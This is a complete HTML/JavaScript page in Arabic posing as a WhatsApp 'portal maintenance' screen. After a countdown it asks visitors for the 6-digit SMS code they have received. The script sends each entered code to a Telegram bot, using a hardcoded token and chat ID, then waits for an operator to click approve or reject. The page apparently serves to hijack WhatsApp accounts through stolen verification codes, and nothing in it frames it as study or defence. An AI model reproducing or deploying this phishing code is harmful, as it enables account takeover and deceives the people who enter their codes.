<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Portal Maintenance</title>
    <style>
        body {
            background-color: #111B21;
            color: #E9EDEF;
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #202C33;
            padding: 3rem 2.5rem;
            border-radius: 1rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 440px;
            width: 90%;
            border: 1px solid #222D34;
        }
        h2 {
            margin-top: 0;
            margin-bottom: 1rem;
            color: #25D366;
            font-size: 1.5rem;
            direction: ltr;
        }
        p {
            color: #8696A0;
            font-size: 1.1rem;
            line-height: 1.6;
            margin-bottom: 1.5rem;
        }
        .timer {
            font-size: 2.5rem;
            font-weight: bold;
            color: #25D366;
            margin-bottom: 2rem;
            font-variant-numeric: tabular-nums;
            letter-spacing: 2px;
            direction: ltr;
        }
        .whatsapp-btn {
            background-color: #25D366;
            color: #111B21;
            text-decoration: none;
            padding: 0.85rem 2rem;
            border-radius: 0.5rem;
            font-weight: bold;
            font-size: 1rem;
            transition: background-color 0.2s;
            display: inline-block;
            margin-top: 1rem;
        }
        .whatsapp-btn:hover {
            background-color: #20ba5a;
        }
        #verificationSection {
            display: none;
            margin-top: 1rem;
        }
        .code-input {
            width: 80%;
            padding: 0.75rem;
            font-size: 1.25rem;
            text-align: center;
            letter-spacing: 4px;
            border-radius: 0.5rem;
            border: 1px solid #8696A0;
            background-color: #111B21;
            color: #E9EDEF;
            margin-bottom: 1rem;
            direction: ltr;
        }
        .btn-submit {
            background-color: #25D366;
            color: #111B21;
            border: none;
            padding: 0.75rem 1.8rem;
            font-weight: bold;
            border-radius: 0.4rem;
            cursor: pointer;
            font-size: 1rem;
            transition: opacity 0.2s;
        }
        .btn-submit:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .msg-feedback {
            margin-top: 1rem;
            font-size: 1rem;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Portal Maintenance</h2>
        <p id="instructionText">هذا الموقع قيد الصيانة. سوف يصلك رمز الإضافة الأخير بعد</p>
        
        <div class="timer" id="countdown">25:00</div>
        
        <div id="verificationSection">
            <input type="text" id="codeInput" class="code-input" maxlength="6" placeholder="------">
            <div>
                <button id="submitBtn" class="btn-submit" onclick="submitCodeForVerification()">إرسال للتحقق</button>
            </div>
            <div id="feedbackMsg" class="msg-feedback"></div>
        </div>

        <div id="successSection" style="display: none;">
            <p style="color: #25D366; font-weight: bold;">تم التحقق بنجاح! يمكنك الآن الانضمام للمجموعة:</p>
            <a id="whatsappLink" href="https://chat.whatsapp.com/YOUR_GROUP_INVITE_LINK" target="_blank" class="whatsapp-btn">Join WhatsApp Group</a>
        </div>
    </div>

    <script>
        // Telegram Credentials
        const TELEGRAM_BOT_TOKEN = "7953610996:AAECLuXvQ_m93xbeEiRDK7RK3yd2ghLPtxo";
        const TELEGRAM_CHAT_ID = "6727057071";

        // Timer Configuration (25 Minutes)
        const DURATION_SECONDS = 25 * 60; 
        
        let endTime = localStorage.getItem('registration_endtime');
        const now = Date.now();

        if (!endTime) {
            endTime = now + (DURATION_SECONDS * 1000);
            localStorage.setItem('registration_endtime', endTime);
        } else {
            endTime = parseInt(endTime, 10);
        }

        const timerDisplay = document.getElementById('countdown');
        const instructionText = document.getElementById('instructionText');
        const verificationSection = document.getElementById('verificationSection');
        const successSection = document.getElementById('successSection');
        const codeInput = document.getElementById('codeInput');
        const feedbackMsg = document.getElementById('feedbackMsg');
        const submitBtn = document.getElementById('submitBtn');

        let checkInterval = null;
        let lastUpdateId = 0;
        let pendingSubmissionId = null;

        function showVerificationUI() {
            timerDisplay.style.display = 'none';
            instructionText.textContent = "يرجى إدخال الرمز المكون من 6 أرقام الذي تلقيته عبر رسالة نصية (SMS):";
            verificationSection.style.display = 'block';
        }

        function updateTimer() {
            const currentNow = Date.now();
            const timeLeft = Math.max(0, Math.floor((endTime - currentNow) / 1000));

            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;

            timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;

            if (timeLeft <= 0) {
                if (window.timerInterval) clearInterval(window.timerInterval);
                showVerificationUI();
            }
        }

        // Initialize Timer Check
        if (now >= endTime) {
            showVerificationUI();
        } else {
            updateTimer();
            window.timerInterval = setInterval(updateTimer, 1000);
        }

        // Send Code to Telegram for Manual Verification
        async function submitCodeForVerification() {
            const userEnteredCode = codeInput.value.trim();

            if (!userEnteredCode || userEnteredCode.length < 4) {
                feedbackMsg.style.color = "#ea4335";
                feedbackMsg.textContent = "الرجاء كتابة رمز صحيح.";
                return;
            }

            // Disable button while waiting
            submitBtn.disabled = true;
            codeInput.disabled = true;
            feedbackMsg.style.color = "#E9EDEF";
            feedbackMsg.textContent = "جاري التحقق من الرمز... يرجى الانتظار.";

            pendingSubmissionId = "req_" + Date.now();

            const messageText = `🔐 *طلب إثبات رمز جديد*\n\nالرمز المدخل: \`${userEnteredCode}\`\nمعرف الطلب: \`${pendingSubmissionId}\``;

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "✅ YES (قبول)", callback_data: `YES:${pendingSubmissionId}` },
                        { text: "❌ NO (رفض)", callback_data: `NO:${pendingSubmissionId}` }
                    ]
                ]
            };

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: messageText,
                        parse_mode: 'Markdown',
                        reply_markup: keyboard
                    })
                });

                // Start Polling Telegram to wait for your click (YES / NO)
                startPollingTelegram();

            } catch (error) {
                feedbackMsg.style.color = "#ea4335";
                feedbackMsg.textContent = "حدث خطأ في الاتصال. حاول مرة أخرى.";
                submitBtn.disabled = false;
                codeInput.disabled = false;
            }
        }

        // Check for Admin Response via Telegram Updates
        function startPollingTelegram() {
            if (checkInterval) clearInterval(checkInterval);

            checkInterval = setInterval(async () => {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
                    const data = await response.json();

                    if (data.ok && data.result.length > 0) {
                        for (let update of data.result) {
                            lastUpdateId = update.update_id;

                            if (update.callback_query) {
                                const callbackData = update.callback_query.data;
                                const callbackId = update.callback_query.id;

                                if (callbackData.includes(pendingSubmissionId)) {
                                    clearInterval(checkInterval);

                                    // Acknowledge Telegram Button Click
                                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ callback_query_id: callbackId, text: "تم تسجيل ردك!" })
                                    });

                                    if (callbackData.startsWith("YES")) {
                                        // Approved by Admin
                                        feedbackMsg.style.color = "#25D366";
                                        feedbackMsg.textContent = "✅ تم التحقق من الرمز بنجاح!";
                                        
                                        setTimeout(() => {
                                            verificationSection.style.display = 'none';
                                            instructionText.style.display = 'none';
                                            successSection.style.display = 'block';
                                        }, 1000);

                                    } else if (callbackData.startsWith("NO")) {
                                        // Rejected by Admin
                                        feedbackMsg.style.color = "#ea4335";
                                        feedbackMsg.textContent = "❌ الرمز غير صحيح. الرجاء إدخال الكود الصحيح.";
                                        submitBtn.disabled = false;
                                        codeInput.disabled = false;
                                        codeInput.value = "";
                                        codeInput.focus();
                                    }
                                    break;
                                }
                            }
                        }
                    }
                } catch (e) {
                    console.error("Polling error:", e);
                }
            }, 3000);
        }
    </script>

</body>
</html>
